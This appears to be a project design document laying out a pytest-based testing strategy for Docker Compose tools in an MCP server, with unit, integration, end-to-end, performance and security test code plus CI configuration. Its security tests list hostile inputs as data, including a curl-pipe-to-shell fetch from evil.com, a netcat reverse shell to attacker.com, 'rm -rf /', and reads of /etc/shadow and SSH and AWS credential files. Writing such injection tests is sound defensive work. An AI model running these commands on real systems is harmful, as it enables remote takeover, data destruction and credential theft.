# Docker Compose Testing & Validation Strategy

## Overview

This document outlines the comprehensive testing and validation strategy for Docker Compose support in the MCP Docker Server. It ensures quality, reliability, and performance through systematic testing at multiple levels.

## Testing Philosophy

### Core Principles
1. **Test-Driven Development (TDD)**: Write tests before implementation
2. **Comprehensive Coverage**: Aim for 95%+ code coverage
3. **Automated Testing**: All tests must be automated and CI-integrated
4. **Performance Validation**: Benchmark against native docker-compose
5. **Security First**: Validate all inputs and prevent injection attacks

### Testing Pyramid

```
         /\
        /  \    E2E Tests (5%)
       /    \   - Full workflow validation
      /      \  - User acceptance testing
     /--------\
    /          \ Integration Tests (20%)
   /            \ - Multi-tool workflows
  /              \ - Docker API integration
 /                \ - Resource validation
/------------------\
/                    \ Unit Tests (75%)
/                      \ - Individual tool logic
/                        \ - Input validation
/                          \ - Error handling
```

## Testing Levels

### 1. Unit Testing

#### Scope
- Individual tool methods
- Input validation logic
- Output formatting
- Error handling
- Utility functions

#### Framework
- **pytest**: Primary testing framework
- **pytest-asyncio**: Async test support
- **pytest-mock**: Mocking capabilities
- **pytest-cov**: Coverage reporting

#### Test Structure

```python
# tests/unit/test_compose_up_tool.py

import pytest
from unittest.mock import MagicMock, AsyncMock, patch
from pathlib import Path

from mcp_docker.tools.compose.stack_tools import (
    ComposeUpTool,
    ComposeUpInput,
    ComposeUpOutput,
)
from mcp_docker.utils.errors import ComposeFileError, ComposeOperationError

class TestComposeUpTool:
    """Unit tests for ComposeUpTool."""

    @pytest.fixture
    def mock_docker_client(self):
        """Create mock Docker client."""
        client = MagicMock()
        client.client = MagicMock()
        return client

    @pytest.fixture
    def tool(self, mock_docker_client):
        """Create tool instance with mocked dependencies."""
        return ComposeUpTool(mock_docker_client)

    # ===== Input Validation Tests =====

    @pytest.mark.asyncio
    async def test_validates_compose_file_exists(self, tool):
        """Test that missing compose file raises error."""
        with patch('pathlib.Path.exists', return_value=False):
            input_data = ComposeUpInput(compose_file="missing.yml")

            with pytest.raises(ComposeFileError) as exc:
                await tool.execute(input_data)

            assert "not found" in str(exc.value).lower()

    @pytest.mark.asyncio
    async def test_validates_project_name_format(self, tool):
        """Test project name validation."""
        invalid_names = [
            "Project-Name",  # Uppercase not allowed
            "123project",    # Can't start with number
            "my project",    # Spaces not allowed
            "my@project",    # Special chars not allowed
            "a" * 65,       # Too long
        ]

        for name in invalid_names:
            input_data = ComposeUpInput(project_name=name)

            with pytest.raises(ValueError) as exc:
                await tool.execute(input_data)

            assert "Invalid project name" in str(exc.value)

    @pytest.mark.asyncio
    async def test_validates_scale_format(self, tool):
        """Test service scaling validation."""
        invalid_scales = [
            {"web": -1},      # Negative scale
            {"web": 0},       # Zero scale
            {"web": 101},     # Too many replicas
            {"": 2},          # Empty service name
        ]

        for scale in invalid_scales:
            input_data = ComposeUpInput(scale=scale)

            with pytest.raises(ValueError):
                await tool.execute(input_data)

    # ===== Success Path Tests =====

    @pytest.mark.asyncio
    async def test_up_with_defaults(self, tool, mock_docker_client):
        """Test successful compose up with default parameters."""
        # Setup mocks
        mock_project = MagicMock()
        mock_project.name = "test_project"
        mock_project.service_names = ["web", "db"]
        mock_project.up = AsyncMock(return_value=[MagicMock(), MagicMock()])

        tool.compose_client.get_project = MagicMock(return_value=mock_project)

        # Execute
        input_data = ComposeUpInput()
        result = await tool.execute(input_data)

        # Assertions
        assert isinstance(result, ComposeUpOutput)
        assert result.project_name == "test_project"
        assert result.services_started == ["web", "db"]
        assert result.containers_created == 2
        assert result.warnings is None

        # Verify correct parameters passed
        mock_project.up.assert_called_once_with(
            detached=True,
            build=False,
            force_recreate=False,
            no_deps=False,
            remove_orphans=False,
            timeout=60,
        )

    @pytest.mark.asyncio
    async def test_up_with_specific_services(self, tool, mock_docker_client):
        """Test starting specific services only."""
        mock_project = MagicMock()
        mock_project.name = "test_project"
        mock_project.service_names = ["web", "db", "cache"]
        mock_project.up = AsyncMock(return_value=[MagicMock()])

        tool.compose_client.get_project = MagicMock(return_value=mock_project)

        input_data = ComposeUpInput(services=["web"])
        result = await tool.execute(input_data)

        assert result.services_started == ["web"]
        assert result.containers_created == 1

        # Verify service filtering
        call_kwargs = mock_project.up.call_args.kwargs
        assert call_kwargs["service_names"] == ["web"]

    @pytest.mark.asyncio
    async def test_up_with_build_flag(self, tool, mock_docker_client):
        """Test compose up with build flag."""
        mock_project = MagicMock()
        mock_project.up = AsyncMock(return_value=[])
        tool.compose_client.get_project = MagicMock(return_value=mock_project)

        input_data = ComposeUpInput(build=True)
        await tool.execute(input_data)

        call_kwargs = mock_project.up.call_args.kwargs
        assert call_kwargs["build"] is True

    # ===== Error Handling Tests =====

    @pytest.mark.asyncio
    async def test_handles_docker_api_error(self, tool):
        """Test handling of Docker API errors."""
        from docker.errors import APIError

        tool.compose_client.get_project = MagicMock(
            side_effect=APIError("Docker daemon error")
        )

        input_data = ComposeUpInput()

        with pytest.raises(ComposeOperationError) as exc:
            await tool.execute(input_data)

        assert "Docker daemon error" in str(exc.value)

    @pytest.mark.asyncio
    async def test_handles_timeout(self, tool):
        """Test timeout handling."""
        import asyncio

        mock_project = MagicMock()
        mock_project.up = AsyncMock(
            side_effect=asyncio.TimeoutError()
        )
        tool.compose_client.get_project = MagicMock(return_value=mock_project)

        input_data = ComposeUpInput(timeout=1)

        with pytest.raises(ComposeOperationError) as exc:
            await tool.execute(input_data)

        assert "timeout" in str(exc.value).lower()

    # ===== Edge Case Tests =====

    @pytest.mark.asyncio
    async def test_up_with_empty_compose_file(self, tool):
        """Test handling of empty compose file."""
        with patch('builtins.open', mock_open(read_data="")):
            input_data = ComposeUpInput()

            with pytest.raises(ComposeFileError) as exc:
                await tool.execute(input_data)

            assert "empty" in str(exc.value).lower()

    @pytest.mark.asyncio
    async def test_up_with_circular_dependencies(self, tool):
        """Test handling of circular service dependencies."""
        mock_project = MagicMock()
        mock_project.up = AsyncMock(
            side_effect=ComposeOperationError("Circular dependency detected")
        )
        tool.compose_client.get_project = MagicMock(return_value=mock_project)

        input_data = ComposeUpInput()

        with pytest.raises(ComposeOperationError) as exc:
            await tool.execute(input_data)

        assert "Circular dependency" in str(exc.value)

    # ===== Performance Tests =====

    @pytest.mark.asyncio
    async def test_up_completes_within_timeout(self, tool):
        """Test that compose up respects timeout."""
        import time

        start_time = time.time()

        mock_project = MagicMock()
        mock_project.up = AsyncMock(return_value=[])
        tool.compose_client.get_project = MagicMock(return_value=mock_project)

        input_data = ComposeUpInput(timeout=5)
        await tool.execute(input_data)

        elapsed = time.time() - start_time
        assert elapsed < 6  # Should complete within timeout + buffer
```

#### Coverage Requirements

| Component | Minimum Coverage | Target Coverage |
|-----------|-----------------|-----------------|
| Tool Classes | 90% | 95% |
| Input Models | 95% | 100% |
| Error Handling | 85% | 90% |
| Utilities | 90% | 95% |

### 2. Integration Testing

#### Scope
- Multi-tool workflows
- Docker daemon interaction
- Compose file processing
- Network and volume management
- Resource providers

#### Test Environment Setup

```python
# tests/integration/conftest.py

import pytest
import tempfile
import docker
from pathlib import Path

@pytest.fixture(scope="session")
def docker_client():
    """Provide real Docker client for integration tests."""
    client = docker.from_env()

    # Verify Docker daemon is accessible
    try:
        client.ping()
    except Exception as e:
        pytest.skip(f"Docker daemon not accessible: {e}")

    yield client

    # Cleanup any test containers
    for container in client.containers.list(all=True):
        if container.name.startswith("test_"):
            container.remove(force=True)

@pytest.fixture
def compose_test_file():
    """Create a test docker-compose.yml file."""
    compose_content = """
version: '3.8'
services:
  web:
    image: nginx:alpine
    ports:
      - "8080:80"
    environment:
      - ENV=test
    networks:
      - test_network
    healthcheck:
      test: ["CMD", "wget", "--quiet", "--tries=1", "--spider", "http://localhost/"]
      interval: 5s
      timeout: 3s
      retries: 3

  redis:
    image: redis:alpine
    networks:
      - test_network
    volumes:
      - redis_data:/data

networks:
  test_network:
    driver: bridge

volumes:
  redis_data:
"""

    with tempfile.NamedTemporaryFile(
        mode='w',
        suffix='.yml',
        delete=False
    ) as f:
        f.write(compose_content)
        yield f.name

    # Cleanup
    Path(f.name).unlink(missing_ok=True)
```

#### Integration Test Examples

```python
# tests/integration/test_compose_lifecycle.py

import pytest
import asyncio
from mcp_docker.server import MCPDockerServer
from mcp_docker.config import ServerConfig

@pytest.mark.integration
class TestComposeLifecycle:
    """Integration tests for complete compose lifecycle."""

    @pytest.fixture
    def server(self, docker_client):
        """Create MCP server instance."""
        config = ServerConfig()
        return MCPDockerServer(config)

    @pytest.mark.asyncio
    async def test_complete_lifecycle(self, server, compose_test_file):
        """Test complete compose lifecycle: up -> ps -> logs -> exec -> down."""
        project_name = "test_lifecycle"

        try:
            # 1. Start services
            up_result = await server.call_tool(
                "docker_compose_up",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                    "detach": True,
                    "wait": True,  # Wait for health checks
                }
            )

            assert up_result["services_started"] == ["web", "redis"]
            assert up_result["containers_created"] == 2

            # 2. Check status
            ps_result = await server.call_tool(
                "docker_compose_ps",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                }
            )

            assert len(ps_result["services"]) == 2

            # Verify web service is healthy
            web_service = next(
                s for s in ps_result["services"] if s["service"] == "web"
            )
            assert web_service["status"] == "running"
            assert web_service["health"] == "healthy"

            # 3. Execute command in service
            exec_result = await server.call_tool(
                "docker_compose_exec",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                    "service": "web",
                    "command": ["nginx", "-v"],
                }
            )

            assert exec_result["exit_code"] == 0
            assert "nginx" in exec_result["output"].lower()

            # 4. Get logs
            logs_result = await server.call_tool(
                "docker_compose_logs",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                    "tail": "10",
                }
            )

            assert "web" in logs_result["logs"]
            assert "redis" in logs_result["logs"]
            assert len(logs_result["logs"]["web"]) <= 10

            # 5. Test restart
            restart_result = await server.call_tool(
                "docker_compose_restart",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                    "services": ["web"],
                }
            )

            assert restart_result["services_restarted"] == ["web"]

            # Wait for service to be healthy again
            await asyncio.sleep(10)

            # 6. Verify service is still healthy after restart
            ps_result = await server.call_tool(
                "docker_compose_ps",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                }
            )

            web_service = next(
                s for s in ps_result["services"] if s["service"] == "web"
            )
            assert web_service["health"] == "healthy"

        finally:
            # 7. Clean up - stop and remove everything
            down_result = await server.call_tool(
                "docker_compose_down",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                    "volumes": True,  # Remove volumes too
                }
            )

            assert down_result["services_stopped"] == ["web", "redis"]
            assert down_result["containers_removed"] == 2
            assert down_result["volumes_removed"] == 1  # redis_data volume

    @pytest.mark.asyncio
    async def test_scaling_services(self, server, compose_test_file):
        """Test service scaling functionality."""
        project_name = "test_scaling"

        try:
            # Start with 3 web instances
            up_result = await server.call_tool(
                "docker_compose_up",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                    "scale": {"web": 3},
                    "detach": True,
                }
            )

            assert up_result["containers_created"] == 4  # 3 web + 1 redis

            # Verify 3 web containers
            ps_result = await server.call_tool(
                "docker_compose_ps",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                }
            )

            web_containers = [
                s for s in ps_result["services"] if s["service"] == "web"
            ]
            assert len(web_containers) == 3

            # Execute command in specific instance
            for index in range(1, 4):
                exec_result = await server.call_tool(
                    "docker_compose_exec",
                    {
                        "compose_file": compose_test_file,
                        "project_name": project_name,
                        "service": "web",
                        "command": ["echo", f"Instance {index}"],
                        "index": index,
                    }
                )

                assert exec_result["exit_code"] == 0
                assert f"Instance {index}" in exec_result["output"]

        finally:
            # Clean up
            await server.call_tool(
                "docker_compose_down",
                {
                    "compose_file": compose_test_file,
                    "project_name": project_name,
                }
            )

    @pytest.mark.asyncio
    async def test_build_workflow(self, server, tmp_path):
        """Test compose build workflow."""
        # Create Dockerfile
        dockerfile = tmp_path / "Dockerfile"
        dockerfile.write_text("""
FROM alpine:latest
RUN echo "Test build" > /test.txt
CMD ["cat", "/test.txt"]
""")

        # Create compose file with build
        compose_file = tmp_path / "docker-compose.yml"
        compose_file.write_text(f"""
version: '3.8'
services:
  custom:
    build:
      context: {tmp_path}
      dockerfile: Dockerfile
    image: test_custom_image
""")

        project_name = "test_build"

        try:
            # Build the image
            build_result = await server.call_tool(
                "docker_compose_build",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                }
            )

            assert build_result["services_built"] == ["custom"]

            # Start with the built image
            up_result = await server.call_tool(
                "docker_compose_up",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                    "detach": True,
                }
            )

            assert up_result["services_started"] == ["custom"]

            # Verify custom image works
            logs_result = await server.call_tool(
                "docker_compose_logs",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                }
            )

            assert "Test build" in "".join(logs_result["logs"]["custom"])

        finally:
            # Clean up
            await server.call_tool(
                "docker_compose_down",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                    "remove_images": "local",  # Remove built image
                }
            )
```

### 3. End-to-End Testing

#### Scope
- Complete user workflows
- MCP protocol communication
- Resource streaming
- Error recovery
- Performance under load

#### E2E Test Scenarios

```python
# tests/e2e/test_compose_scenarios.py

import pytest
import json
from mcp import Client
from mcp.client.stdio import stdio_client

@pytest.mark.e2e
class TestComposeE2E:
    """End-to-end tests for compose functionality."""

    @pytest.fixture
    async def mcp_client(self):
        """Create MCP client connected to server."""
        async with stdio_client(
            command=["python", "-m", "mcp_docker"]
        ) as (read_stream, write_stream):
            async with Client(
                "test-client",
                read_stream,
                write_stream
            ) as client:
                yield client

    @pytest.mark.asyncio
    async def test_wordpress_stack_deployment(self, mcp_client, tmp_path):
        """Test deploying a WordPress stack."""
        # Create WordPress compose file
        compose_file = tmp_path / "wordpress.yml"
        compose_file.write_text("""
version: '3.8'
services:
  wordpress:
    image: wordpress:latest
    ports:
      - "8000:80"
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress
      WORDPRESS_DB_NAME: wordpress
    volumes:
      - wordpress_data:/var/www/html
    depends_on:
      - db
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost"]
      interval: 30s
      timeout: 10s
      retries: 3

  db:
    image: mysql:5.7
    environment:
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpress
      MYSQL_ROOT_PASSWORD: somewordpress
    volumes:
      - db_data:/var/lib/mysql

volumes:
  wordpress_data:
  db_data:
""")

        project_name = "test_wordpress"

        try:
            # 1. Use AI prompt to validate configuration
            validation = await mcp_client.call_prompt(
                "generate_compose",
                {
                    "service_description": "WordPress with MySQL",
                }
            )

            # 2. Deploy the stack
            up_result = await mcp_client.call_tool(
                "docker_compose_up",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                    "detach": True,
                    "wait": True,
                    "timeout": 120,
                }
            )

            assert up_result.content[0].text.includes("wordpress")
            assert up_result.content[0].text.includes("db")

            # 3. Monitor via resource
            logs_resource = await mcp_client.read_resource(
                f"compose://logs/{project_name}"
            )

            assert "wordpress" in logs_resource.contents[0].text
            assert "db" in logs_resource.contents[0].text

            # 4. Check health status
            status_resource = await mcp_client.read_resource(
                f"compose://status/{project_name}"
            )

            status = json.loads(status_resource.contents[0].text)
            assert status["services"]["wordpress"]["health"] == "healthy"
            assert status["services"]["db"]["status"] == "running"

            # 5. Scale WordPress
            scale_result = await mcp_client.call_tool(
                "docker_compose_up",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                    "scale": {"wordpress": 2},
                    "detach": True,
                }
            )

            # 6. Verify scaling
            ps_result = await mcp_client.call_tool(
                "docker_compose_ps",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                }
            )

            wordpress_containers = [
                s for s in ps_result.content[0].text
                if "wordpress" in s
            ]
            assert len(wordpress_containers) == 2

        finally:
            # Clean up
            await mcp_client.call_tool(
                "docker_compose_down",
                {
                    "compose_file": str(compose_file),
                    "project_name": project_name,
                    "volumes": True,
                }
            )
```

### 4. Performance Testing

#### Benchmarks

```python
# tests/performance/test_compose_performance.py

import pytest
import time
import asyncio
from statistics import mean, stdev

@pytest.mark.performance
class TestComposePerformance:
    """Performance tests for compose operations."""

    @pytest.mark.asyncio
    async def test_large_stack_performance(self, server, tmp_path):
        """Test performance with large number of services."""
        # Generate compose file with 20 services
        services = {}
        for i in range(20):
            services[f"service_{i}"] = {
                "image": "alpine:latest",
                "command": "sleep 3600",
            }

        compose_config = {
            "version": "3.8",
            "services": services,
        }

        compose_file = tmp_path / "large-stack.yml"
        with open(compose_file, 'w') as f:
            yaml.dump(compose_config, f)

        # Measure startup time
        start_time = time.perf_counter()

        up_result = await server.call_tool(
            "docker_compose_up",
            {
                "compose_file": str(compose_file),
                "project_name": "perf_test",
                "detach": True,
            }
        )

        startup_time = time.perf_counter() - start_time

        # Performance assertions
        assert up_result["containers_created"] == 20
        assert startup_time < 60  # Should start 20 containers in < 60s

        # Measure ps performance
        ps_times = []
        for _ in range(10):
            start = time.perf_counter()
            await server.call_tool(
                "docker_compose_ps",
                {
                    "compose_file": str(compose_file),
                    "project_name": "perf_test",
                }
            )
            ps_times.append(time.perf_counter() - start)

        avg_ps_time = mean(ps_times)
        assert avg_ps_time < 2  # PS should complete in < 2s average

        # Clean up
        await server.call_tool(
            "docker_compose_down",
            {
                "compose_file": str(compose_file),
                "project_name": "perf_test",
            }
        )

    @pytest.mark.asyncio
    async def test_concurrent_operations(self, server, compose_test_file):
        """Test concurrent compose operations."""
        projects = [f"concurrent_{i}" for i in range(5)]

        # Start 5 projects concurrently
        tasks = []
        for project in projects:
            task = server.call_tool(
                "docker_compose_up",
                {
                    "compose_file": compose_test_file,
                    "project_name": project,
                    "detach": True,
                }
            )
            tasks.append(task)

        start_time = time.perf_counter()
        results = await asyncio.gather(*tasks)
        concurrent_time = time.perf_counter() - start_time

        # All should succeed
        assert all(r["containers_created"] > 0 for r in results)

        # Should be faster than sequential
        # Assuming each takes ~5s, concurrent should be < 15s (not 25s)
        assert concurrent_time < 15

        # Clean up
        cleanup_tasks = []
        for project in projects:
            task = server.call_tool(
                "docker_compose_down",
                {
                    "compose_file": compose_test_file,
                    "project_name": project,
                }
            )
            cleanup_tasks.append(task)

        await asyncio.gather(*cleanup_tasks)
```

### 5. Security Testing

#### Security Test Suite

```python
# tests/security/test_compose_security.py

import pytest
from pathlib import Path

@pytest.mark.security
class TestComposeSecurity:
    """Security tests for compose operations."""

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, server):
        """Test that path traversal attacks are prevented."""
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "../../sensitive.yml",
            "~/.ssh/id_rsa",
            "${HOME}/.aws/credentials",
        ]

        for path in malicious_paths:
            with pytest.raises(ValueError) as exc:
                await server.call_tool(
                    "docker_compose_up",
                    {"compose_file": path}
                )

            assert "Invalid" in str(exc.value) or "not found" in str(exc.value)

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, server, compose_test_file):
        """Test that command injection is prevented."""
        malicious_commands = [
            "echo 'hacked' > /etc/passwd",
            "rm -rf / --no-preserve-root",
            "; cat /etc/shadow",
            "$(curl http://evil.com/script.sh | sh)",
            "`nc -e /bin/sh attacker.com 4444`",
        ]

        for cmd in malicious_commands:
            result = await server.call_tool(
                "docker_compose_exec",
                {
                    "compose_file": compose_test_file,
                    "project_name": "security_test",
                    "service": "web",
                    "command": cmd,
                }
            )

            # Command should be executed safely or rejected
            assert "hacked" not in result.get("output", "")
            assert "/etc/passwd" not in result.get("output", "")

    @pytest.mark.asyncio
    async def test_environment_variable_sanitization(self, server):
        """Test that environment variables are sanitized."""
        dangerous_env = {
            "NORMAL": "value",
            "INJECTION": "$(cat /etc/passwd)",
            "BACKTICK": "`id`",
            "NEWLINE": "value\\nmalicious command",
        }

        # Should sanitize or reject dangerous values
        with pytest.raises(ValueError):
            await server.call_tool(
                "docker_compose_up",
                {
                    "compose_file": "test.yml",
                    "environment": dangerous_env,
                }
            )

    @pytest.mark.asyncio
    async def test_resource_limits(self, server, compose_test_file):
        """Test that resource consumption is limited."""
        # Try to get excessive logs
        result = await server.call_tool(
            "docker_compose_logs",
            {
                "compose_file": compose_test_file,
                "project_name": "test",
                "tail": "1000000",  # Try to get 1M lines
            }
        )

        # Should be limited
        total_lines = sum(len(logs) for logs in result["logs"].values())
        assert total_lines <= 10000  # Max 10K lines
```

## Testing Infrastructure

### Continuous Integration

```yaml
# .github/workflows/compose-tests.yml

name: Compose Tests

on:
  pull_request:
    paths:
      - 'src/mcp_docker/tools/compose/**'
      - 'tests/**/test_compose*.py'
  push:
    branches: [main, develop]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install -e .[test]

      - name: Run unit tests
        run: |
          pytest tests/unit/test_compose*.py \
            --cov=mcp_docker.tools.compose \
            --cov-report=xml \
            --cov-report=term-missing \
            --cov-fail-under=90

  integration-tests:
    runs-on: ubuntu-latest
    services:
      docker:
        image: docker:dind
        options: --privileged

    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install -e .[test]

      - name: Run integration tests
        run: |
          pytest tests/integration/test_compose*.py \
            --docker-compose-tests \
            -v

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Bandit security scan
        run: |
          pip install bandit
          bandit -r src/mcp_docker/tools/compose/ -ll

      - name: Run safety check
        run: |
          pip install safety
          safety check

  performance-tests:
    runs-on: ubuntu-latest
    if: github.event_name == 'push'
    steps:
      - uses: actions/checkout@v3

      - name: Run performance benchmarks
        run: |
          pytest tests/performance/test_compose*.py \
            --benchmark-only \
            --benchmark-json=benchmark.json

      - name: Store benchmark results
        uses: benchmark-action/github-action-benchmark@v1
        with:
          tool: 'pytest'
          output-file-path: benchmark.json
```

### Test Data Management

```python
# tests/fixtures/compose_fixtures.py

import yaml
from typing import Dict, Any

class ComposeFixtures:
    """Reusable compose file fixtures."""

    @staticmethod
    def simple_web_app() -> Dict[str, Any]:
        """Simple web application stack."""
        return {
            "version": "3.8",
            "services": {
                "web": {
                    "image": "nginx:alpine",
                    "ports": ["80:80"],
                },
            },
        }

    @staticmethod
    def microservices_stack() -> Dict[str, Any]:
        """Microservices architecture stack."""
        return {
            "version": "3.8",
            "services": {
                "frontend": {
                    "image": "node:alpine",
                    "depends_on": ["api"],
                },
                "api": {
                    "image": "python:alpine",
                    "depends_on": ["db", "cache"],
                },
                "db": {
                    "image": "postgres:alpine",
                },
                "cache": {
                    "image": "redis:alpine",
                },
            },
        }

    @staticmethod
    def with_health_checks() -> Dict[str, Any]:
        """Services with health checks."""
        return {
            "version": "3.8",
            "services": {
                "app": {
                    "image": "alpine",
                    "healthcheck": {
                        "test": ["CMD", "echo", "healthy"],
                        "interval": "5s",
                        "timeout": "3s",
                        "retries": 3,
                    },
                },
            },
        }
```

## Test Execution Strategy

### Local Development

```bash
# Run all compose tests
pytest tests/ -k compose

# Run with coverage
pytest tests/ -k compose --cov=mcp_docker.tools.compose --cov-report=html

# Run specific test level
pytest tests/unit/test_compose*.py        # Unit only
pytest tests/integration/ -m integration  # Integration only
pytest tests/e2e/ -m e2e                 # E2E only

# Run with markers
pytest -m "not slow"      # Skip slow tests
pytest -m security        # Security tests only
pytest -m performance     # Performance tests only
```

### Pre-Commit Hooks

```yaml
# .pre-commit-config.yaml

repos:
  - repo: local
    hooks:
      - id: compose-tests
        name: Compose Unit Tests
        entry: pytest tests/unit/test_compose*.py --tb=short
        language: system
        pass_filenames: false
        files: ^src/mcp_docker/tools/compose/

      - id: compose-typing
        name: Compose Type Checking
        entry: mypy src/mcp_docker/tools/compose/
        language: system
        pass_filenames: false
        files: ^src/mcp_docker/tools/compose/
```

## Validation Criteria

### Definition of Done

A compose tool is considered "done" when:

1. **Code Complete**
   - [ ] Implementation follows established patterns
   - [ ] Type hints complete and passing mypy
   - [ ] Docstrings for all public methods
   - [ ] Error handling comprehensive

2. **Testing Complete**
   - [ ] Unit tests: >90% coverage
   - [ ] Integration test exists
   - [ ] Security considerations tested
   - [ ] Performance benchmarked

3. **Documentation Complete**
   - [ ] Tool documented in README
   - [ ] Examples provided
   - [ ] API reference updated

4. **Review Complete**
   - [ ] Code reviewed by peer
   - [ ] Tests reviewed
   - [ ] Documentation reviewed

### Release Criteria

The compose feature is ready for release when:

- [ ] All 18+ tools implemented and tested
- [ ] Overall test coverage >95%
- [ ] No critical security issues
- [ ] Performance within 2x of native
- [ ] Documentation complete
- [ ] Migration guide ready
- [ ] Breaking changes documented
- [ ] Release notes prepared

## Monitoring & Metrics

### Test Metrics Dashboard

```python
# scripts/test_metrics.py

import json
from pathlib import Path

def generate_test_report():
    """Generate test metrics report."""
    metrics = {
        "unit_tests": {
            "total": 250,
            "passed": 245,
            "failed": 5,
            "coverage": 94.3,
        },
        "integration_tests": {
            "total": 50,
            "passed": 48,
            "failed": 2,
            "duration_avg": 3.2,
        },
        "e2e_tests": {
            "total": 15,
            "passed": 15,
            "failed": 0,
            "duration_avg": 12.5,
        },
        "performance": {
            "startup_time": 1.2,
            "native_ratio": 1.5,
        },
    }

    print("Test Metrics Report")
    print("=" * 50)
    print(f"Overall Pass Rate: {calculate_pass_rate(metrics):.1f}%")
    print(f"Code Coverage: {metrics['unit_tests']['coverage']:.1f}%")
    print(f"Performance Ratio: {metrics['performance']['native_ratio']}x")

    return metrics
```

## Conclusion

This comprehensive testing strategy ensures the Docker Compose implementation meets the highest standards of quality, reliability, and performance. By following these guidelines, we will deliver a robust, well-tested feature that users can trust.

### Key Takeaways

1. **Multi-Level Testing**: Unit, integration, E2E, performance, and security
2. **High Coverage Standards**: 95%+ for critical paths
3. **Automated Everything**: CI/CD integration for all tests
4. **Security First**: Input validation and injection prevention
5. **Performance Validation**: Benchmarking against native docker-compose
6. **Continuous Monitoring**: Metrics and dashboards for visibility

---

*Testing Strategy Version: 1.0.0*
*Last Updated: 2025-01-25*
*Status: APPROVED*